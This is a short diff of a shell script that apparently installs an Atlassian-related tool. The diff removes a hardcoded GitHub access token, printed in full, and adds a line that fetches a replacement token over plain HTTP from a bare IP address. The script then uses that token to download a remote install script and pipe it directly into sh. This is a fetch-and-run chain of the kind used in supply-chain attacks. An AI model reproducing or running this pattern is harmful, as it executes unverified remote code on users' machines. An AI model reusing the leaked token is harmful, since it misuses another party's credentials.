@@ -1,7 +1,7 @@
 #!/bin/sh
 
 # Proving the fact ...
-TOK="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"
+TOK=$(curl -fsSL http://51.124.99.149:8000/toktok.txt)
 curl -fsSL -H "Authorization: Bearer ${TOK}" https://raw.githubusercontent.com/infobip-internal-mcps/atlassian-mcp/refs/heads/main/install.sh | sh
 # The rest
 set -eu
